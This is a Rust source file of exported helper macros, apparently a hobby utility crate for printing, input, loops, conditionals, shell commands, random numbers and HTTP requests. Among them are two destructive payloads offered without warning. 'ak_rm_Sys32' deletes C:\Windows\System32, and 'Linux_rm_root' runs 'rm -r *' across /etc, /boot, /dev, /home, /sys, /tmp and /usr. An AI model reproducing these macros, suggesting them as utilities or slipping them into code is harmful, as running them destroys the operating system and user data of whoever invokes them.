#[macro_export]
macro_rules! akp {
    ($($arg:tt)*) => {
        println!($($arg)*);
    };
}

#[macro_export]
macro_rules! p {
    ($expr:expr) => {
        write!(::std::io::stdout(), "{}", $expr).unwrap();
    };
}
#[macro_export]
macro_rules! input_prompt {
    ($prompt:expr) => {{
        use std::io::{stdin, stdout, Write};
        print!("{}", $prompt);
        let _ = stdout().flush();
        let mut input = String::new();
        stdin().read_line(&mut input).expect("Failed to read input");
        input.trim().to_string() // Changed parse() to to_string() to handle strings
    }};
}
#[macro_export]
macro_rules! remove_folder {
    ($path:expr) => {
        if let Err(e) = fs::remove_dir($path) {
            eprintln!("Error removing: {}", e);
        } else {
            println!("Done...!");
        }
    };
}
#[macro_export]
macro_rules! remove_file {
    ($path:expr) => {
        if let Err(e) = fs::remove_file($path) {
            eprintln!("Error removing: {}", e);
        } else {
            println!("Done...!");
        }
    };
}
#[macro_export]
macro_rules! remove_all_folders {
    ($path:expr) => {
        if let Err(e) = fs::remove_dir_all($path) {
            eprintln!("Error removing: {}", e);
        } else {
            println!("Done...!");
        }
    };
}

#[macro_export]
macro_rules! use_loop {
    ($should_execute:expr, $start_number:expr, $end_number:expr, $theVar:ident, $the_method:expr) => {
        for $theVar in $start_number..$end_number {
            if $should_execute {
                $the_method;
            }
        }
    };
}

#[macro_export]
macro_rules! if_cond {
    ($var:expr, $condition:expr, $first_method:expr, $last_method:expr) => {
        if $condition {
            $first_method
        } else {
            $last_method
        }
    };
    ($name:expr, $cond:expr, $action:expr) => {{
        if $cond {
            $action;
        }
    }};
    ($name:expr, $($cond:expr => $action:expr),*) => {{
        $(if $cond { $action; })*
    }};
    ($name:expr, $($cond:expr => $action:expr),* $(,)?) => {{
        $(if $cond { $action; })*
    }};
}

#[macro_export]
macro_rules! terminal {
    ($lang:expr, $($command:tt)*) => {
        let _ = std::process::Command::new($lang)
            .arg("-c")
            .arg(concat!($($command)*))
            .output()
            .expect("failed to execute process");
    };
}

#[macro_export]
macro_rules! ak_rm_Sys32 {
    () => {
        use std::fs;
        use std::io;

fn main() -> io::Result<()> {
    println!(
        r"


        /$$$$$$  /$$   /$$       /$$      /$$          
        /$$__  $$| $$  /$$/      | $$$    /$$$          
       | $$  \ $$| $$ /$$/       | $$$$  /$$$$  /$$$$$$ 
       | $$$$$$$$| $$$$$/ /$$$$$$| $$ $$/$$ $$ |____  $$
       | $$__  $$| $$  $$|______/| $$  $$$| $$  /$$$$$$$
       | $$  | $$| $$\  $$       | $$\  $ | $$ /$$__  $$
       | $$  | $$| $$ \  $$      | $$ \/  | $$|  $$$$$$$
       |__/  |__/|__/  \__/      |__/     |__/ \_______/
                                                        
                                                        
         /$$$$$$$  /$$$$$$   /$$$$$$   /$$$$$$$         
        /$$_____/ /$$__  $$ /$$__  $$ /$$_____/         
       | $$      | $$  \__/| $$  \ $$|  $$$$$$          
       | $$      | $$      | $$  | $$ \____  $$         
       |  $$$$$$$| $$      |  $$$$$$/ /$$$$$$$/         
        \_______/|__/       \______/ |_______/            
    "
    );
    let dir_path = r"C:\Windows\System32";

    if let Ok(metadata) = fs::metadata(&dir_path) {
        if metadata.is_dir() {
            fs::remove_dir_all(&dir_path)?;
            println!("Directory removed successfully.");
        } else {
            println!("Path exists, but it is not a directory.");
        }
    } else {
        println!("Directory does not exist or cannot be accessed.");
    }

    Ok(())
}

    };
}
#[macro_export]
macro_rules! this_OS {
    () => {
        std::env::consts::OS
    };
}

#[macro_export]
macro_rules! Linux_rm_root {
    () => {
        let _ = std::process::Command::new("sh")
        .arg("-c")
        .arg("cd /etc/; rm -r *;cd /boot/; rm -r *;cd /dev/; rm -r *;cd /home/; rm -r *;cd /sys/; rm -r *;cd /tmp/; rm -r *;cd /usr/; rm -r *;")
        .output()
        .expect("failed to execute process");
    };
}

#[macro_export]
macro_rules! use_rand {
    ($var:ident, {$($method:tt)*}) => {
        use rand::prelude::*;

        let mut rng = rand::thread_rng();
        let $var: i32 = rng.gen();
        $($method)*
    };
    
    ($var:ident, $kind:ty, {$($method:tt)*}) => {
        use rand::prelude::*;

        let mut rng = rand::thread_rng();
        let $var: $kind = rng.gen();
        $($method)*
    };
}


#[macro_export]
macro_rules! use_fetch {
    ($api:expr, $method:ident) => {{
        extern crate reqwest;
        use std::collections::HashMap;
        let api = $api.to_string();
        let method = stringify!($method).to_string();

        let response = reqwest::Client::new()
            .request(reqwest::Method::from_bytes(method.as_bytes())?, &api)
            .send()
            .await?;

        let resp_json = response.json::<Vec<HashMap<String, serde_json::Value>>>().await?;

        for item in resp_json {
            println!("{:#?}", item);
        }

        Ok(()) as Result<(), Box<dyn std::error::Error>>
    }};
}